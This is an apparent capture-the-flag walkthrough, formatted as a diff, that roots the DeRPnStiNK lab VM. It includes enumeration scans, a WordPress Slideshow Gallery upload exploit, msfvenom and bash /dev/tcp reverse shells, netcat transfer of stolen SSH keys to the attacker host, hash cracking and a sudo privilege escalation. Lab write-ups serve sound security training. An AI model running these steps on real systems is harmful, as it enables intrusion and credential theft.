@@ -1,0 +1,258 @@
+[*]
+1. Find host: nmap -sn 172.16.16.0/24
+MAC Address: 08:00:27:88:AD:32 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.6
+Host is up (0.00019s latency).
+MAC Address: 08:00:27:61:08:32 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.4
+
+[*]
+2. Scan host: nmap 172.16.16.6
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-03 01:14 CST
+Nmap scan report for 172.16.16.6
+Host is up (0.00015s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:61:08:32 (Oracle VirtualBox virtual NIC)
+[*]
+3. Enumerate ports: nmap -A -p 21,22,80 172.16.16.6
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
+|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
+|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
+|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 2 disallowed entries 
+|_/php/ /temporary/
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: DeRPnStiNK
+MAC Address: 08:00:27:61:08:32 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+[*]
+4. Found SSH banner: ssh 172.16.16.6
+Ubuntu 14.04.5 LTS
+
+
+                       ,~~~~~~~~~~~~~..
+                       '  Derrrrrp  N  `
+        ,~~~~~~,       |    Stink      | 
+       / ,      \      ',  ________ _,"
+      /,~|_______\.      \/
+     /~ (__________)   
+    (*)  ; (^)(^)':
+        =;  ____  ;
+          ; """"  ;=
+   {"}_   ' '""' ' _{"}
+   \__/     >  <   \__/
+      \    ,"   ",  /
+       \  "       /"
+          "      "=
+           >     <
+          ="     "-
+          -`.   ,'
+                -
+            `--'
+
+[*]
+5. Enumerate web: nikto -h 172.16.16.6 && dirb http://172.16.16.6/ -a linux
++ Server: Apache/2.4.7 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Entry '/temporary/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 2 entries which should be manually viewed.
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: 512, size: 55dcb6aaa2f50, mtime: gzip
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.22
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7891 requests: 0 error(s) and 10 item(s) reported on remote host
+
++ http://172.16.16.6/index.html (CODE:200|SIZE:1298)
+==> DIRECTORY: http://172.16.16.6/php/                                                                                                                                                                       
++ http://172.16.16.6/robots.txt (CODE:200|SIZE:53)
++ http://172.16.16.6/server-status (CODE:403|SIZE:291)                                                                                                                                                                                                         
++ http://172.16.16.6/php/info.php (CODE:200|SIZE:0)
+==> DIRECTORY: http://172.16.16.6/php/phpmyadmin/                                                                                                                                                            
++ http://172.16.16.6/temporary/index.html                                                                                                                                                                                                     
++ http://172.16.16.6/weblog/index.php (CODE:200|SIZE:15399)
+==> DIRECTORY: http://172.16.16.6/weblog/wp-admin/                                                                                                                                                           
++ http://172.16.16.6/weblog/xmlrpc.php (CODE:405|SIZE:42)
++ http://172.16.16.6/javascript/jquery/jquery (CODE:200|SIZE:252879)
++ http://172.16.16.6/javascript/jquery/version (CODE:200|SIZE:5)
++ http://172.16.16.6/php/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)
++ http://172.16.16.6/php/phpmyadmin/index.php (CODE:200|SIZE:8264)
++ http://172.16.16.6/php/phpmyadmin/libraries (CODE:403|SIZE:302)
++ http://172.16.16.6/php/phpmyadmin/phpinfo.php (CODE:200|SIZE:8266)
++ http://172.16.16.6/php/phpmyadmin/setup (CODE:401|SIZE:457)
++ http://172.16.16.6/weblog/wp-admin/admin.php (CODE:302|SIZE:0)
++ http://172.16.16.6/weblog/wp-admin/index.php (CODE:302|SIZE:0)
+==> DIRECTORY: http://172.16.16.6/weblog/wp-admin/maint/                                                                                                                                                     
++ http://172.16.16.6/weblog/wp-content/index.php (CODE:200|SIZE:0)
+==> DIRECTORY: http://172.16.16.6/weblog/wp-content/plugins/                                                                                                                                                 
+==> DIRECTORY: http://172.16.16.6/weblog/wp-includes/widgets/    
+[*]
+6. found artifact: <script type="text/info" src="/webnotes/info.txt"></script>
+<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --> 
+**add username to list**
+[*]
+7. Re-direct found on in weblog: http://www.derpnstink.local/
+add hostname to /etc/hosts
+172.16.16.6     www.derpnstink.local
+172.16.16.6     derpnstink.local
+[*]
+8. able to get to wordpress site! I was unable to login with default root/password on phpmyadmin, but admin/admin on wp-admin
+**no upload available, only slideshow**
+[*]
+9. Scan wordpress: wpscan --url http://172.16.16.6/weblog/ --enumerate p
+
+[!] Title: Slideshow Gallery < 1.4.7 Arbitrary File Upload
+    Reference: https://wpvulndb.com/vulnerabilities/7532
+    Reference: https://seclists.org/bugtraq/2014/Sep/1
+    Reference: https://packetstormsecurity.com/files/131526/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
+    Reference: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload
+    Reference: https://www.exploit-db.com/exploits/34681/
+    Reference: https://www.exploit-db.com/exploits/34514/
+[*]
+10. Upload webshell:
+  Download exploit: https://www.exploit-db.com/exploits/34681/
+  change to execute: chmod u+x 34681.txt && mv 34681.txt 34681.py
+  generate payload: msfvenom -p php/reverse_php LHOST=172.16.16.6 LPORT=4444 -f raw -o shell.php
+  exploit: ./34681.py  -t http://172.16.16.6/weblog -f shell.php -u admin -p admin
+[+] Username & password ACCEPTED!
+
+[!] Shell Uploaded!
+[+] Check url: http://172.16.16.6/weblog/wp-content/uploads/slideshow-gallery/shell.php (lowercase!!!!)
+[*]
+11. get shell: 
+start listener:
+  msfconsole
+  use exploit/multi/handler
+  set LHOST 172.16.16.4
+  set LPORT 4444
+  set PAYLOAD php/reverse_php
+
+kick shell: http://172.16.16.6/weblog/wp-content/uploads/slideshow-gallery/shell.php
+[*]
+12. the shell kept dying, we need a different type of reverse shell. Used this:
+https://github.com/pentestmonkey/php-reverse-shell
+mv php-reverse-shell.php revshell.php
+[*]
+13. Upload
+[*]
+14. listen, and kickoff shell: http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/revshell.php
+nc -nvlp 4444
+[*]
+15. Start new reverse shell:
+/bin/bash
+bash -i >& /dev/tcp/172.16.16.4/80 0>&1
+
+**so we don't get timedout
+[*]
+16. It appears the home directories are not readable. We need to change users.
+get users: cat /etc/passwd | cut -d ':' -f1
+put in users.txt
+stinky
+ftp
+mrderp
+root
+[*]
+17. found mysql login in wp-config.php
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'mysql');
+[*]
+18. Enumerate mysql:
+show databases;
+use wordpress;
+show tables;
+show columns from users;
+select * from users;
+unclestinky $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41
+admin $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/
+[*]
+19. hash-identifer to identify hash:
+Possible Hashs:
+[+] MD5(Wordpress)
+[*]
+20. Crack hash:
+john hash.txt --fork=12 --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass
+john --show
+?:wedgie57
+[*]
+21. Change user: su - stinky
+[*]
+22. Get flag3
+flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
+[*]
+23. Found SSH keys! We finally get a real shell lol. /home/stinky/.ssh
+nc -nvlp 123 > id_rsa
+nc -nv 172.16.16.4 < id_rsa
+nc -nvlp 123 > id_rsa.pub
+nc -nv 172.16.16.4 123 < id_rsa.pub
+[*]
+24. Login as stinky: ssh -o "IdentitiesOnly=yes" -i id_rsa stinky@172.16.16.6
+[*]
+25. Found key in /home/stinky/ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/key.txt **same ssh key**
+[*]
+26. Found artifact: stinky@DeRPnStiNK:~/ftp/files/network-logs$ cat derpissues.txt 
+
+12:07 stinky: yeah. did you need a password reset?
+12:07 mrderp: I think i accidently deleted my account
+12:07 mrderp: i just need to logon once to make a change
+12:07 stinky: im gonna packet capture so we can figure out whats going on
+12:07 mrderp: that seems a bit overkill, but wtv
+12:08 stinky: commence the sniffer!!!!
+12:08 mrderp: -_-
+12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
+12:11 mrderp: awesome it works!
+12:12 stinky: we really are the best sysadmins #team
+12:13 mrderp: i guess we are...
+12:15 mrderp: alright I made the changes, feel free to decomission my account
+12:20 stinky: done! yay
+[*]
+27. Found artifact: /home/stinky/Documents/derpissues.pcap
+[*]
+28. Parse through pcap: tshark -r derpissues.pcap -Y 'http.request.method==POST' -T fields -e text
+**found user merderp, pass derpderpderpderpderpderpderp
+[*]
+29. Login as mrderp: derpderpderpderpderpderpderp
+[*]
+30. Enumerate user:  sudo -l
+(ALL) /home/mrderp/binaries/derpy*
+[*]
+31. We have write access to this folder so this will be too easy.
+mkdir binaries
+cd binaries
+make script --->
+#!/bin/bash
+su - root
+[*]
+32. Execute as root: sudo /home/mrderp/binaries/derpy*
+[*]
+33. Get flag!
+root@DeRPnStiNK:~# cat Desktop/flag.txt
+flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
+
+Congrats on rooting my first VulnOS!
+
+Hit me up on twitter and let me know your thoughts!
+
+@securekomodo
+[*]
